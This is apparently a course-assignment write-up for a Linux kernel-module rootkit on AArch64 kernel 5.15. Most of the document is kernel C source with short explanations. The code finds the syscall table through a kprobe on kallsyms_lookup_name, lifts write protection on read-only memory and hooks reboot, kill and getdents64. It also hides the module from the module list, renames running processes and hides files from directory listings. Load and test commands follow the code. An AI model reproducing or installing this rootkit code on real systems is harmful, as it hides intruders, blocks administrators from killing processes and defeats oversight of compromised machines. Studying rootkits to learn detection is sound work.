You can also see this document on [HackMD](https://hackmd.io/@Cr1xxty1RMCCkPcMXYPWeg/rootkit)
- [Intro_Rootkit](#Intro-Rootkit)
- [Explanation](#Explanation)
- [How to use this LKM](#How-to-use-this-LKM)
- [Reference](#Reference)

## Intro Rootkit
About Environment:
> Both the rookit and the test program run on an AArch64 machine.
> The rootkit work as an independent module on the mainline Linux v5.15.

Rootkit as you might have heard before, is essentially the malware that runs in the kernel space. To achieve these functions, you must implement it as a loadable kernel module (LKM). 

LKM runs in kernel mode and allows access to all kernel internal structures/functions. It can be used to extend the functionality of the running kernel, and thus it is also often used to implement device drivers to support new hardware.

It's a simple rootkit and provide the following functions: 
(1) hide/unhide module
(2) masquerade process name
(3) hook/unhook syscall 

## Explanation
After entering rootkit_init, first obtain the sys_call_table, and then save the address of the syscall table that will be replaced by the hook later.
```c=
__sys_call_table = get_syscall_table();
if(!__sys_call_table) {
    printk(KERN_INFO "Failed to find sys_call_table\n");
    return 1;
}

orig_reboot = (t_syscall)__sys_call_table[__NR_reboot];
orig_kill = (t_syscall)__sys_call_table[__NR_kill];
orig_getdents64 = (t_syscall)__sys_call_table[__NR_getdents64];
```

Using kprobe to locate `kallsyms_lookup_name`, then obtaining the required parameters from kallsyms_lookup_name.
```c=
static unsigned long *get_syscall_table(void)
{
    unsigned long *syscall_table;
	
    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
    kallsyms_lookup_name_t kallsyms_lookup_name;
    register_kprobe(&kp);
    kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
    unregister_kprobe(&kp);

    syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
    update_mapping_prot = (void *)kallsyms_lookup_name("update_mapping_prot");
    start_rodata = (unsigned long)kallsyms_lookup_name("__start_rodata");
    init_begin = (unsigned long)kallsyms_lookup_name("__init_begin");

    printk(KERN_INFO "sys_call_table address: %p\n", syscall_table);
    return syscall_table;
}
```

When hooking, it is necessary to remove the read-only restrictions, rewrite the addresses corresponding to the syscall table, and then revert them back to read-only after completion.
```c=
static inline void protect_memory(void)
{
    update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata, section_size, PAGE_KERNEL_RO); // Read - only
    printk(KERN_INFO "Memory protected\n");
}

static inline void unprotect_memory(void)
{
    update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata, section_size, PAGE_KERNEL); // Read - write
    printk(KERN_INFO "Memory unprotected\n");
}

static int hook(void){
    unprotect_memory();

    __sys_call_table[__NR_reboot] = (unsigned long) &hacked_reboot;
    __sys_call_table[__NR_kill] = (unsigned long) &hacked_kill;
    __sys_call_table[__NR_getdents64] = (unsigned long) &hacked_getdents64;

    protect_memory();
    return 0;
}

```
Before removing the module, unhooking the syscall is necessary. This involves restoring the original addresses corresponding to the syscall table.
```c=
static void __exit rootkit_exit(void)
{
    
    unprotect_memory();

    __sys_call_table[__NR_reboot] = (unsigned long)orig_reboot; 
    __sys_call_table[__NR_kill] = (unsigned long) orig_kill;
    __sys_call_table[__NR_getdents64] = (unsigned long) orig_getdents64;

    protect_memory();

    pr_info("%s: removed\n", OURMODNAME);
    cdev_del(kernel_cdev);
    unregister_chrdev_region(major, 1);
}
```
---
> Let's go deeper into the functions we talked before

**Hide/Unhide module**
Using 'hidden' to determine whether the current state is hidden or unhidden. If it's unhidden, remove oneself from the Linked List and store the previous one for later reconnection.
```c=
// hidden module part
static struct list_head *prev_module;
static short hidden = 0;
void module_show(void)
{
    /* Add the saved list_head struct back to the module list */
    list_add(&THIS_MODULE->list, prev_module);
    hidden = 0;
    printk(KERN_INFO "module unhidden\n");
}
void module_hide(void)
{
    /* Save the module in the list before us, so we can add ourselves
     * back to the list in the same place later. */
    prev_module = THIS_MODULE->list.prev;
    /* Remove ourselves from the list module list */
    list_del(&THIS_MODULE->list);
    hidden = 1;
    printk(KERN_INFO "module hidden\n");
}
```
**Masquerade process name**
First, fetch the required data structure from the user space into the kernel space, and then call 'change_process_name' to replace the name. According to the specifications, if the length of the new name is greater than or equal to the old name, skip the process.
```c= 
case IOCTL_MOD_MASQ:
    if (copy_from_user(&user_req, (struct masq_proc_req *)arg, sizeof(struct masq_proc_req)))
        return -EFAULT;

    req_array = kmalloc_array(user_req.len, sizeof(struct masq_proc), GFP_KERNEL);
    if (!req_array) {
        printk(KERN_INFO "Memory allocation failed\n");
        return -ENOMEM;
    }

    if (copy_from_user(req_array, user_req.list, user_req.len * sizeof(struct masq_proc))) {
        kfree(req_array);
        return -EFAULT;
    }

    for (i = 0; i < user_req.len; ++i) {
        if (strlen(req_array[i].new_name) >= strlen(req_array[i].orig_name)) {
        // printk(KERN_INFO "Error: New name '%s' should be shorter than original name '%s'\n", req_array[i].new_name, req_array[i].orig_name);
            continue;
        }
        change_process_name(req_array[i].orig_name, req_array[i].new_name);
        // printk(KERN_INFO "Received masq_proc[%zu]: Original name: %s, New name: %s\n", i, req_array[i].orig_name, req_array[i].new_name);
    }
```
Find the corresponding process name within the process and replace it.

```c=
int change_process_name(const char *orig_name, const char *new_name) {
    struct task_struct *p = NULL;
    int found = 0;
    
    for_each_process(p) {
        if (strcmp(p->comm, orig_name) == 0) {
            strncpy(p->comm, new_name, TASK_COMM_LEN - 1);
            p->comm[TASK_COMM_LEN - 1] = '\0'; // make sure string tail is NULL 
            found = 1;
            printk(KERN_INFO "Process with original name '%s' found and renamed to '%s'\n", orig_name, new_name);
        }
    }

    return found ? 0 : -1;
}

```

**Reboot**
According to [this website](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md), to query the registers needed for the reboot System table, we only need to know the value of the cmd to determine if it is a poweroff. If the cmd is LINUX_REBOOT_CMD_POWER_OFF, then we need to interrupt. For the rest, we execute the original reboot syscall as usual, by directly transferring to orig_reboot(pt_regs).
```c=
static asmlinkage int hacked_reboot(const struct pt_regs *pt_regs) {
    unsigned int cmd;
    cmd = (unsigned int) pt_regs->regs[2];
    printk(KERN_INFO "enter hacked reboot section.\n");

    if(cmd == LINUX_REBOOT_CMD_POWER_OFF) {
        printk(KERN_INFO "power off command intercepted and denied.\n");
        return 0;
    }

    return orig_reboot(pt_regs);
}
```


**kill**
According to [this website](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md), to determine the signal used by the user, it is stored in regs[1].

When the user employs the kill command, there are two cases:
If sig == 9, the hook should intercept the signal and prevent SIGKILL from occurring.
Otherwise, proceed with the original kill operation.
```c=
static asmlinkage int hacked_kill(const struct pt_regs *pt_regs)
{
    int sig = (int) pt_regs->regs[1];
    printk(KERN_INFO "enter hacked kill section.\n");

    switch (sig) {
        case 9:
            printk(KERN_INFO "kill signal intercepted and denied.\n");
            break;
        default:
            return orig_kill(pt_regs);
    }
    return 0;
}
```
**getdents64**
When using the ls command, the readdir function is called to invoke getdents64 to retrieve files/directories. In this modified version, some alterations have been made during the traversal process to hide specific files or directories.
```c=
static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs) {
...
    while (off < ret) {
        dir = (void *)kdirent + off;
        if (((HIDDEN_FILE && *HIDDEN_FILE != '\0') && (!proc && (memcmp(HIDDEN_FILE, dir->d_name, strlen(HIDDEN_FILE)) == 0))) || (proc && is_invisible(simple_strtoul(dir->d_name, NULL, 10)))){
            if (dir == kdirent) {
                ret -= dir->d_reclen;
                memmove(dir, (void *)dir + dir->d_reclen, ret);
                continue;
            }
            prev->d_reclen += dir->d_reclen;
        } else
            prev = dir;
        off += dir->d_reclen;
    }
...
out:
	kfree(kdirent);
	return ret;
}
```


## How to use this LKM
### Load My LKM
```bash=
make
sudo insmod rootkit.ko
dmesg | tail
# the following command based on the major number for your device number
sudo mknod /dev/rootkit c xxx 0
```
### Generate files for testing
```bash=
# generate userTest, NTUST, MIT, hsuckd executable files
make generateTestFile
```

```bash=
# Functions corresponding to each executable file in userTest.
$ sudo ./userTest 0 -> IOCTL_MOD_HIDE
$ sudo ./userTest 1 -> IOCTL_MOD_MASQ
$ sudo ./userTest 2 -> IOCTL_MOD_HOOK
$ sudo ./userTest 3 -> IOCTL_FILE_HIDE
```

### Hide/Unhide module (10%)
```bash=
# 0 is the hide/unhiden module function 
sudo ./userTest 0
```

### Masquerade process name (30%)
```bash=
# execute the program
./NTUST
./MIT

# see their pid and name
ps ao pid,comm

# Trigger Masquerade process name
sudo ./userTest 1

# see their pid and name
ps ao pid,comm

# you will find NTUST -> NTU
# but MIT didn't change to standardford
# because the length of the new_name string is longer than the orig_name. 
```

## Hook/Unhook syscall (40%)
```bash=
#  install the rewritten syscall hook 
#  so that you can proceed with the following three hook syscall tests
sudo ./userTest 2
```

### reboot (10%)
```bash=
# It should invoke the reboot syscall directly
# test poweroff, It won't work
sudo systemctl --force --force poweroff

#The machine still works.

# test another reboot call, It works
sudo systemctl --force --force reboot
```

### kill (10%)
```bash=
# run a test program
./hsuckd
# find the pid of your program
ps aux | grep hsuckd
# send SIGKILL to it
kill -9 pid
# after sent SIGKILL, the program is still alive
ps aux | grep hsuckd

# If you use another number, like kill -10
# It still works
```

### getdents64 (20%)
```bash=
# you can see the file "HiddenFile"
ls

sudo ./userTest 3

# after that, you can not see the file "HiddenFile"
ls
```

## Reference
* [Linux Rootkit 學習資源筆記](https://hackercat.org/linux/linux-rootkit-resource "Linux Rootkit 學習資源筆記")
* [Linux LKM Rootkit Tutorial | Linux Kernel Module Rootkit](https://www.youtube.com/watch?v=hsk450he7nI "Linux LKM Rootkit Tutorial | Linux Kernel Module Rootkit")
* [Linux Rootkit系列](https://cloud.tencent.com/developer/article/1036559 "Linux Rootkit系列")
* [TheXcellerator Linux Rootkits](https://xcellerator.github.io/tags/rootkit/ "TheXcellerator Linux Rootkits")
* [Hiding Kernel Modules](https://github.com/xcellerator/linux_kernel_hacking/tree/master/3_RootkitTechniques/3.0_hiding_lkm)
* [linux_kernel_hacking](https://github.com/xcellerator/linux_kernel_hacking/tree/master)
* [Diamorphine](https://github.com/m0nad/Diamorphine/tree/master)
